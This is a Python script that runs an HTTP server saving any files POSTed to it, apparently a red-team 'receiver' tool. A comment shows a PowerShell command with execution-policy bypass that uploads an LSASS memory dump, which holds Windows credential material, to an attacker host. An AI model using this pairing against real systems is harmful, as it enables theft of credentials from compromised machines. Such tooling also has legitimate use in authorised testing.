#!/usr/bin/env python3

import argparse
import cgi
import logging
import os
import socket
from http import server


logging.basicConfig(format='%(name)s %(levelname)s [%(asctime)s] %(message)s', level=logging.INFO)
logger = logging.getLogger('receiver')


# Example usage:
#   powershell -exec bypass "(New-Object System.Net.WebClient).UploadFile('http://VAR_ATTACKER_HOST:8080/lsass.dmp', 'C:\Windows\Temp\lsass.dmp')"

class FileHandler(server.BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_POST(self):
        file_name = self.path.partition('/')[-1]
        logger.info('Saving file {} ({} bytes) from {}...'.format(file_name, self.headers['Content-Length'], self.headers['HOST']))
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={
                'REQUEST_METHOD': 'POST',
                'CONTENT_TYPE': self.headers['Content-Type'],
            }
        )
        upload = form.getvalue('file')
        if upload and file_name:
            local_path = os.path.join(os.curdir, file_name)
            with open(local_path, 'wb') as fil:
                fil.write(upload)
            logger.info('Saved {}'.format(local_path))
            self.send_response(200)
        else:
            self.send_response(400)
            self.send_header('Content-type', 'text/html')
            self.end_headers()


class HTTPServerV6(server.HTTPServer):

    address_family = socket.AF_INET6


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description='Saves files sent over HTTP POST to /path_is_filename.',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('-lh', '--addr', help='Listening address', default='')
    parser.add_argument('-lp', '--port', help='Listening port', type=int, default=8080)
    parser.add_argument('-6', '--ipv6', help='Enable IPv6', action='store_true')
    args = parser.parse_args()
    logger.info('Started HTTP server at {}'.format(':'.join([args.addr, str(args.port)])))
    server_cls = HTTPServerV6 if args.ipv6 else server.HTTPServer
    server = server_cls((args.addr, args.port), FileHandler)
    server.serve_forever()
